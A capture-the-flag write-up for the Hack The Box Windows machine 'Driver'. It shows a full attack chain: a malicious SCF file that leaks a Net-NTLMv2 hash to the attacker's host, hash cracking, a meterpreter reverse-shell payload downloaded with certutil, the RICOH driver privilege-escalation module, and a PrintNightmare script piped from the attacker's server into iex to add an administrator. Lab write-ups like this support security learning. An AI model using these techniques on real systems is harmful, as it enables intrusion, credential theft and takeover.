---
tags:
  - scf
  - printnightmare
  - CVE-2019-19363
  - CVE-2021-34527
group: Windows
---
![](https://labs.hackthebox.com/storage/avatars/ce42ce9fd28d117b8d6c045aefeb5cdb.png)

- Machine : https://app.hackthebox.com/machines/Driver/
- Reference : https://0xdf.gitlab.io/2022/02/26/htb-driver.html
- Solved : 2024.12.09. (Mon) (Takes 1day)

## Summary
---

1. **Initial Enumeration**
	- **Open Ports**:
	    
	    - Discovered critical services such as HTTP (IIS), RPC, SMB, and WinRM.
	    - Identified `Guest` access enabled for SMB, and HTTP service requiring basic authentication.
	- **Directory and Service Enumeration**:
	    
	    - Used `Gobuster` to identify the `/images/` directory on the HTTP server.
	    - Captured and decoded HTTP Basic Authentication headers to identify potential default credentials.
	    - 
2. **Web Exploitation**
	- **SMB Share Analysis**:    
	    - Uploaded a malicious `.SCF` file to the file share, triggering an SMB-based Net-NTLMv2 hash capture using `Responder`.
	- **Hash Cracking**:
	    - Cracked the captured Net-NTLMv2 hash using `hashcat` and the `rockyou` wordlist to retrieve a valid user's plaintext password.

3. **Initial Shell Access**
	- **WinRM Authentication**:
	    - Used the cracked credentials to authenticate via WinRM and gained a shell as a low-privileged user (`tony`).

4. **Privilege Escalation**
	 Method 1: **RICOH Driver Vulnerability**
	- **Enumeration**:
	    - Discovered PowerShell history revealing the use of a vulnerable RICOH printer driver.
	    - Used Metasploit's `ricoh_driver_privesc` module to exploit this driver for local privilege escalation.
	- **Exploit Execution**:
	    - Delivered a payload through the driver and escalated to `SYSTEM` privileges.
	    
	Method 2: **PrintNightmare Exploit**
	- **Exploitation Setup**:
	    - Used `Invoke-Nightmare` PowerShell script to exploit the Print Spooler service vulnerability.
	- **Outcome**:
	    - Added a new user with administrator privileges.
	    - Logged in via WinRM using the newly created administrator account.

### Key Techniques:

- **Open Port and Service Enumeration**: Identified key services such as HTTP, SMB, and WinRM.
- **SMB Share Exploitation**: Used SMB guest access to upload malicious files for hash capture.
- **Net-NTLMv2 Hash Cracking**: Captured and cracked Net-NTLMv2 hashes for valid user credentials.
- **WinRM Authentication**: Gained initial shell access using cracked credentials.
- **PowerShell History Analysis**: Analyzed PowerShell history to identify misconfigurations or vulnerabilities.
- **RICOH Driver Exploitation**: Exploited RICOH printer driver vulnerability for local privilege escalation.
- **PrintNightmare Exploitation**: Leveraged Print Spooler service vulnerability to escalate privileges to Administrator.

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ./port-scan.sh 10.10.11.106
Performing quick port scan on 10.10.11.106...
Found open ports: 80,135,445,5985
Performing detailed scan on 10.10.11.106...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 07:27 EST
Nmap scan report for 10.10.11.106
Host is up (0.11s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-12-09T19:27:13
|_  start_date: 2024-12-09T19:18:32
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.41 seconds
```

There are 4 ports open : http(80), rpc(135), smb(445), winrm(5985)
- http(80) : Looks like it's IIS(Windows) server. Looks like it's asking id/password.
- smb(445) : Guest login is allowed.

### http(80)

Let's see if there is any sub directories using `gobuster`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ gobuster dir -u http://10.10.11.106 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.106
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://10.10.11.106/images/]
```

![](attachments/driver_1.png)

As I found from port scanning, 
Let's send login request with test credential, and capture the request using `burpsuite`.

```http
GET / HTTP/1.1
Host: 10.10.11.106
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```

It looks like the typed credential is encoded in `Authorization` header.
Let's decode it.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ echo 'dXNlcm5hbWU6cGFzc3dvcmQ=' | base64 -d
username:password
```

Also, I captured a response using Firefox dev tool.

```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.25
WWW-Authenticate: Basic realm="MFP Firmware Update Center. Please enter password for admin"
Date: Fri, 10 Sep 2021 02:36:15 GMT
Connection: close
Content-Length: 20

Invalid Credentials
```

This message is giving the username, admin. The first thing I typically guess is admin as the password, and it works.

![](attachments/driver_2.png)

This looks like a printer driver web page.
I visited the menus above but except "Firmware Updates" page, all the other links are disabled.

![](attachments/driver_3.png)


# Shell as `tony`

### `SCF` file to attack `SMB share` to capture `Net-NTLMv2` hash

The page says that what I upload will go to their file share. That implies it’s not going to the webserver necessarily, so looking for a way to upload webshell doesn’t make much sense.

If I have a file share permission in some directory, upload SCF file to the directory can be a method to trigger Net-NTLMv2 communication.

Here's the reference for this attack:
https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

First, I prepared an `SCF` file.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ cat bokchee.scf 
[Shell]
Command=2

IconFile=\\10.10.14.14\icon
```

Then, let's upload it to the MFP firmware update folder.

![](attachments/driver_4.png)

Before that I have to run `responder` to capture hash.

```scss
┌──(kali㉿kali)-[~/htb]
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

<SNIP>

[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:59a1af1f9da0e697:480E81F2B9D1BBFE44C1AC70452BC1A7:010100000000000000378BA6424ADB0138527E50DD6684BA000000000200080032004B005500490001001E00570049004E002D005100430030004D0055004D004500530038003500590004003400570049004E002D005100430030004D0055004D00450053003800350059002E0032004B00550049002E004C004F00430041004C000300140032004B00550049002E004C004F00430041004C000500140032004B00550049002E004C004F00430041004C000700080000378BA6424ADB01060004000200000008003000300000000000000000000000002000004D137E540D34B87EBDEF0F5FA2DB848138801D6B3BFC9CDCA2174C79916171B80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003400000000000000000000000000                       
```

Here I've got a `tony`'s hash!
Let's crack it using `hashcat`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ hashcat -m 5600 -a 0 tony.ntlm /usr/share/wordlists/rockyou.txt.gz 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: cpu--0x000, 1437/2939 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

<SNIP>

TONY::DRIVER:59a1af1f9da0e697:480e81f2b9d1bbfe44c1ac70452bc1a7:010100000000000000378ba6424adb0138527e50dd6684ba000000000200080032004b005500490001001e00570049004e002d005100430030004d0055004d004500530038003500590004003400570049004e002d005100430030004d0055004d00450053003800350059002e0032004b00550049002e004c004f00430041004c000300140032004b00550049002e004c004f00430041004c000500140032004b00550049002e004c004f00430041004c000700080000378ba6424adb01060004000200000008003000300000000000000000000000002000004d137e540d34b87ebdef0f5fa2db848138801d6b3bfc9cdca2174c79916171b80a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000:liltony
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TONY::DRIVER:59a1af1f9da0e697:480e81f2b9d1bbfe44c1a...000000
Time.Started.....: Mon Dec  9 14:09:48 2024 (0 secs)
Time.Estimated...: Mon Dec  9 14:09:48 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)

```

I got `tony`'s credential : `liltony`

```bash
┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 10.10.11.106 -u tony -p liltony 
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:False)
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony


┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec winrm 10.10.11.106 -u tony -p liltony
SMB         10.10.11.106    5985   DRIVER           [*] Windows 10 Build 10240 (name:DRIVER) (domain:DRIVER)
HTTP        10.10.11.106    5985   DRIVER           [*] http://10.10.11.106:5985/wsman
WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
```

The credential is valid, and I can open a shell using `evil-winrm`!

```bash
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.10.11.106 -u tony -p liltony

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine               

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                 

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents> whoami
driver\tony
```


# (1st approach) Shell as `SYSTEM`

### Enumeration

```powershell
*Evil-WinRM* PS C:\Users\tony\Documents> .\winPEASx64.exe


ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.0.10240.17146
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 134B


ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
È Check for some passwords or keys in the env variables 
    COMPUTERNAME: DRIVER
    USERPROFILE: C:\Users\tony
    HOMEPATH: \Users\tony
    LOCALAPPDATA: C:\Users\tony\AppData\Local
    PSModulePath: C:\Users\tony\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Program Files\iis express\PHP\v7.3;C:\Program Files\iis express\PHP\v7.4;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files\MySQL\MySQL Server 5.5\bin;C:\Program Files\Microsoft\Web Platform Installer\;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 25
    LOGONSERVER: \\DRIVER
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    HOMEDRIVE: C:
    SystemRoot: C:\Windows
    ALLUSERSPROFILE: C:\ProgramData
    PUBLIC: C:\Users\Public
    APPDATA: C:\Users\tony\AppData\Roaming
    PROCESSOR_REVISION: 0101
    USERNAME: tony
    CommonProgramW6432: C:\Program Files\Common Files
    OneDrive: C:\Users\tony\OneDrive
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: DRIVER
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    TEMP: C:\Users\tony\AppData\Local\Temp
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 2
    TMP: C:\Users\tony\AppData\Local\Temp
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: DRIVER


ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups
  [X] Exception: Object reference not set to an instance of an object.
  Current user: tony
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Network, Authenticated Users, This Organization, Local account, NTLM Authentication


ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation                                                               
    SeShutdownPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeTimeZonePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED


ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                             
    (DRIVER\Administrator) VerifyFirmware: C:\Users\tony\appdata\local\job\job.bat                                                                    
    Permissions file: tony [AllAccess]
    Permissions folder(DLL Hijacking): tony [AllAccess]
    Trigger: At log on of DRIVER\tony
```

Among the findings, let's visit `powrshell history` first.

```powershell
*Evil-WinRM* PS C:\Users\tony\Documents> cat C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1
```

It has to do with `RICOH_PCL6` printer universal driver.
Let's find if there's any vulnerability regarding this.

https://www.exploit-db.com/exploits/48036

Here I can find metasploit version of exploit.
To use this, let's open a meterpreter shell.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=9000 -f exe -o rshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: rshell.exe

┌──(kali㉿kali)-[~/htb]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.106 - - [09/Dec/2024 15:50:59] "GET /rshell.exe HTTP/1.1" 200 -
```

Window's side

```powershell
*Evil-WinRM* PS C:\Users\tony\Documents> certutil -urlcache -split -f http://10.10.14.14:8000/rshell.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.


*Evil-WinRM* PS C:\Users\tony\Documents> .\rshell.exe
```

Metasploit:

```bash
┌──(kali㉿kali)-[~/htb]
└─$ msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh,
                                         thread, process, none)
   LHOST                      yes       The listen address (an interface m
                                        ay be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf6 exploit(multi/handler) > set LPORT 9000
LPORT => 9000
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.14:9000 
[*] Sending stage (201798 bytes) to 10.10.11.106
[*] Meterpreter session 1 opened (10.10.14.14:9000 -> 10.10.11.106:49433) at 2024-12-09 15:53:19 -0500

meterpreter > getuid
Server username: DRIVER\tony
```

```bash
msf6 exploit(windows/local/ricoh_driver_privesc) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf6 exploit(windows/local/ricoh_driver_privesc) > set LPORT 9001
LPORT => 9001
msf6 exploit(windows/local/ricoh_driver_privesc) > run

[*] Started reverse TCP handler on 10.10.14.14:9001 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[-] Exploit aborted due to failure: bad-config: The payload should use the same architecture as the target driver
[*] Deleting printer 
[*] Exploit completed, but no session was created.
```

Initial trial was not successful. 
Let's migrate the process and run it again.

```bash
meterpreter > migrate 3112
[*] Migrating from 4508 to 3112...
[*] Migration completed successfully.
meterpreter > bg
[*] Backgrounding session 1...


msf6 exploit(windows/local/ricoh_driver_privesc) > set SESSION 1
SESSION => 1

msf6 exploit(windows/local/ricoh_driver_privesc) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/ricoh_driver_privesc) > options

Module options (exploit/windows/local/ricoh_driver_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh
                                        , thread, process, none)
   LHOST     10.10.14.14      yes       The listen address (an interface
                                        may be specified)
   LPORT     4445             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ricoh_driver_privesc) > run

[*] Started reverse TCP handler on 10.10.14.14:4445 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer RAyMud...
[*] Sending stage (201798 bytes) to 10.10.11.106
[+] Deleted C:\Users\tony\AppData\Local\Temp\jrdhuG.bat
[+] Deleted C:\Users\tony\AppData\Local\Temp\headerfooter.dll
[*] Meterpreter session 2 opened (10.10.14.14:4445 -> 10.10.11.106:49435) at 2024-11-25 04:59:55 -0500
[*] Deleting printer RAyMud

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

I got the root!

# (2nd approach) Shell as `Administrator`

Let's exploit using `PrintNightmare` exploit.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ git clone https://github.com/calebstewart/CVE-2021-1675
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 40 (delta 1), reused 1 (delta 1), pack-reused 37 (from 1)
Receiving objects: 100% (40/40), 127.17 KiB | 2.89 MiB/s, done.
Resolving deltas: 100% (9/9), done.
                                                                            
┌──(kali㉿kali)-[~/htb]
└─$ cd CVE-2021-1675

┌──(kali㉿kali)-[~/htb/CVE-2021-1675]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Then, let's run it through `IEX` without saving file. The target powershell doesn't allow script execution.

```powershell
*Evil-WinRM* PS C:\Users\tony\Documents> curl http://10.10.14.14:8000/CVE-2021-1675.ps1 -UseBasicParsing | iex
*Evil-WinRM* PS C:\Users\tony\Documents> Get-Command Invoke-Nightmare

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Invoke-Nightmare


*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -NewUser "bokchee" -NewPassword "bokchee"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user bokchee as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

Then, let's try connecting through `evil-winrm` with created account.

```bash
┌──(kali㉿kali)-[~/htb/CVE-2021-1675]
└─$ evil-winrm -i 10.10.11.106 -u bokchee -p bokchee
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine               
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                 
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\bokchee\Documents> whoami
driver\bokchee

*Evil-WinRM* PS C:\Users\bokchee\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

I got `Administrator`'s shell!